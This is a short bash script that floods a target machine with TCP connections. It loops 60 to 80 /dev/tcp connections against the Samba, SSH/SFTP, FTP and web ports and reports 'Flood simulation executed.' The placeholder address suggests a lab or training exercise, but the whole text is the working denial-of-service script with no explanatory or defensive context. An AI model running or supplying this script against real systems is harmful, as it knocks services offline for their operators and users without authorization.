#!/bin/bash

TARGET_IP="IP_МАШИНЫ_2"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

dos_samba() {
    for i in {1..60}; do
        exec 3<>/dev/tcp/${TARGET_IP}/445 2>/dev/null &
    done
}

dos_sftp() {
    for i in {1..60}; do
        exec 3<>/dev/tcp/${TARGET_IP}/22 2>/dev/null &
    done
}

dos_vsftpd() {
    for i in {1..60}; do
        exec 3<>/dev/tcp/${TARGET_IP}/21 2>/dev/null &
    done
}

dos_webdav() {
    for i in {1..80}; do
        exec 3<>/dev/tcp/${TARGET_IP}/80 2>/dev/null &
    done
}

if [ "$1" == "samba" ]; then dos_samba;
elif [ "$1" == "sftp" ]; then dos_sftp;
elif [ "$1" == "vsftpd" ]; then dos_vsftpd;
elif [ "$1" == "webdav" ]; then dos_webdav;
else
    dos_samba
    dos_sftp
    dos_vsftpd
    dos_webdav
fi

echo "Flood simulation executed."
exit 0
